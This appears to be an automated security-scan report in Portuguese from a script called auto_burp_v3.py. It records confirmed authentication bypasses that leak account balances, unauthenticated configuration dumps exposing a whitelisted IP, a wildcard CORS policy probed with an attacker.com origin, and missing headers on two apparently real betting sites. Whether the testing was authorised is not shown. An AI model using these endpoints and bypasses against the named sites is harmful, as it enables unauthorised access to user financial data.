# Resultados — auto_burp_v3.py

_2026-06-09T17:42:41.858213_

## Resumo

- 🔴 critical: 2
- 🟠 high: 2
- 🟡 medium: 6
- 🔵 low: 0
- ⚪ info: 2

## Achados (severidade desc)

### [CRITICAL] [amizade777] replicate — F01 token anão

**Interpretação:** F01 confirmado em amizade777 — bypass + vaza saldo.

**Request:**
```json
{
  "path": "/japi/user/balance/querySimpleBalance"
}
```

**Response:**
```json
{
  "code_dwarf": 200,
  "code_invalid": 401,
  "data": {
    "amount": 2447500,
    "withdrawAmount": 447500,
    "inviteAmount": 0
  }
}
```

---

### [CRITICAL] [rainha777slots] replicate — F01 token anão

**Interpretação:** F01 confirmado em rainha777slots — bypass + vaza saldo.

**Request:**
```json
{
  "path": "/japi/user/balance/querySimpleBalance"
}
```

**Response:**
```json
{
  "code_dwarf": 200,
  "code_invalid": 401,
  "data": {
    "amount": -19997926,
    "withdrawAmount": 74,
    "inviteAmount": 0
  }
}
```

---

### [HIGH] [amizade777] dwarf_map_deep — /japi/user/balance/querySimpleBalance

**Interpretação:** Bypass de auth confirmado, sem PII visível neste endpoint.

**Request:**
```json
{
  "path": "/japi/user/balance/querySimpleBalance",
  "uid_sonda": 1,
  "uid_invalido": 999999999
}
```

**Response:**
```json
{
  "code_sonda": 200,
  "code_invalid": 401,
  "data_keys": [
    "amount",
    "withdrawAmount",
    "inviteAmount"
  ],
  "leaked_sensitive_fields": [],
  "data_sample": "{\"amount\": 2447500, \"withdrawAmount\": 447500, \"inviteAmount\": 0}"
}
```

---

### [HIGH] [rainha777slots] dwarf_map_deep — /japi/user/balance/querySimpleBalance

**Interpretação:** Bypass de auth confirmado, sem PII visível neste endpoint.

**Request:**
```json
{
  "path": "/japi/user/balance/querySimpleBalance",
  "uid_sonda": 1,
  "uid_invalido": 999999999
}
```

**Response:**
```json
{
  "code_sonda": 200,
  "code_invalid": 401,
  "data_keys": [
    "amount",
    "withdrawAmount",
    "inviteAmount"
  ],
  "leaked_sensitive_fields": [],
  "data_sample": "{\"amount\": -19997926, \"withdrawAmount\": 74, \"inviteAmount\": 0}"
}
```

---

### [MEDIUM] [amizade777] replicate — F03 security headers

**Interpretação:** Faltam 6 headers.

**Request:**
```json
{
  "path": "/"
}
```

**Response:**
```json
{
  "missing": [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Referrer-Policy",
    "Permissions-Policy"
  ],
  "present": [
    "Content-Type",
    "Content-Length",
    "Connection",
    "Server",
    "Date",
    "Last-Modified",
    "Accept-Ranges",
    "Vary",
    "ETag",
    "X-Cache",
    "Via",
    "X-Amz-Cf-Pop",
    "X-Amz-Cf-Id"
  ]
}
```

---

### [MEDIUM] [amizade777] replicate — F03 CORS preflight

**Interpretação:** ACO='*'

**Request:**
```json
{
  "origin": "https://attacker.com"
}
```

**Response:**
```json
{
  "ACO": "*",
  "ACC": ""
}
```

---

### [MEDIUM] [amizade777] replicate — I03 config dump (sem auth)

**Interpretação:** Config dump funciona SEM autenticação em amizade777.

**Request:**
```json
{
  "path": "/prod-api/set/get"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "leaked_keys": [
    "ipWhites",
    "device_user_limit",
    "ip_user_limit",
    "withdraw_min",
    "recharge_amount_max",
    "ab_condition"
  ],
  "ipWhites": "15.229.81.27"
}
```

---

### [MEDIUM] [rainha777slots] replicate — F03 security headers

**Interpretação:** Faltam 6 headers.

**Request:**
```json
{
  "path": "/"
}
```

**Response:**
```json
{
  "missing": [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Referrer-Policy",
    "Permissions-Policy"
  ],
  "present": [
    "Content-Type",
    "Content-Length",
    "Connection",
    "Server",
    "Date",
    "Last-Modified",
    "Accept-Ranges",
    "Vary",
    "ETag",
    "X-Cache",
    "Via",
    "X-Amz-Cf-Pop",
    "X-Amz-Cf-Id"
  ]
}
```

---

### [MEDIUM] [rainha777slots] replicate — F03 CORS preflight

**Interpretação:** ACO='*'

**Request:**
```json
{
  "origin": "https://attacker.com"
}
```

**Response:**
```json
{
  "ACO": "*",
  "ACC": ""
}
```

---

### [MEDIUM] [rainha777slots] replicate — I03 config dump (sem auth)

**Interpretação:** Config dump funciona SEM autenticação em rainha777slots.

**Request:**
```json
{
  "path": "/prod-api/set/get"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "leaked_keys": [
    "ipWhites",
    "device_user_limit",
    "ip_user_limit",
    "withdraw_min",
    "recharge_amount_max",
    "ab_condition"
  ],
  "ipWhites": "15.229.81.27"
}
```

---

